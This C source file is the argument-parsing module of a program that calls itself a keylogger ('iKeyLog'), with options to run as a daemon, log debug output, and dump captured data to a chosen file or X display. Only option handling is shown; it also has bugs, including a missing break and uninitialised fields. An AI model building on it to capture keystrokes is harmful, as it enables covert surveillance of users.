#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include "ikeylog.h"
#include "display.h"
#include "args.h"


/**
 * Print help message 
 */
static void args_banner () {
    printf("iKeyLog - *KeyLogger (c) by %s\n\n", D_IKEYLOG_AUTHOR);
}


static void args_help() {
    args_banner();
    printf("Usage: ikeylog [--daemon] [--debug] [-h] [-o output]");
    printf(" [--version] [-x DISPLAY]\n\n");
    
    printf("   --daemon     - Run process as daemon\n");
    printf("   --debug      - Run with debug messages\n");
    printf("   -h           - Print help message\n");
    printf("   -o <output>  - Specify where to dump data (default: stdout)\n");
    printf("   --version    - Print version\n");
    printf("   -x <display> - Specify which DISPLAY should be used ");
    printf("(default: getenv(\"DISPLAY\"))\n");
}


/**
 * Check arguments.
 * 
 * @param argc No. of parameters
 * @param argv The parameters
 * @return own options structure (ixkeylog_opts)
 */
ixkeylog_opts *args_check(int argc, char **argv)
{
    ixkeylog_opts *opts;
    int option_index = 0;
    int c;
    const char *short_options = "ho:x:";
    
    /* Allocate memory for own opts structure */
    if((opts = malloc(sizeof(struct _opts))) == NULL)
        M_DISPLAY_ERROR;
    
    /* Parse parameters */
    while((c = getopt_long(
            argc, argv, 
            short_options, long_options, 
            &option_index
         )) != 1) 
    {
        /* Detect the end of the options. */
        if (c == -1)
            break;
            
        switch (c) {
            case 0:
                //opts_name = (char *)long_options[option_index].name;
                
                if(args_debug_flag)                 /* --debug */
                    opts->debug = 1;
                else if(args_daemonize_flag)        /* --daemon */
                    opts->daemon = 1;
                else if(args_version_flag) {        /* --version */
                    opts->version = 1;
                    args_banner();
                    printf("Version: %s\n", D_IXKEYLOG_VERSION);
                    exit(EXIT_SUCCESS);
                }
                    
                break;
            
            case 'h':
                args_help();
                exit(EXIT_SUCCESS);
                
            case 'o':
                opts->output = optarg;
                break;
                
            case 'x':
                opts->display = optarg;
                
            case '?':
                /* getopt_long already printed an error message. */
                break;

            default:
                break;
        }
    }
    
    return opts;
}
